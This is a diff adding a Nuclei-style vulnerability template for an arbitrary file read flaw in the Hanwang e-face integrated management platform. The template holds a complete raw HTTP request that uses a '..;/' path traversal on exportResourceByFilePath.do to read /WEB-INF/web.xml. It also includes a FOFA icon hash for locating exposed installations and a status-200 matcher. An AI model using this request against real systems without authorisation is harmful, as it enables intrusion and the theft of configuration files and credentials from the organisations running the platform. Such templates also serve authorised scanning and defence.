@@ -1,0 +1,29 @@
+id: poc-lugarg1448g2hvrt
+info:
+  name: 汉王e脸通综合管理平台 exportResourceByFilePath.do 存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lugarg1448g2hvrt'
+  tags: rce,lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lugarg1448g2hvrt
+    fofa: icon_hash="1380907357"
+http:
+- raw:
+  - 'GET /manage/intercom/..;/..;/manage/leaveList/exportResourceByFilePath.do?filePath=/WEB-INF/web.xml HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+
+    Accept-Encoding: gzip, deflate
+
+    Accept: */*
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
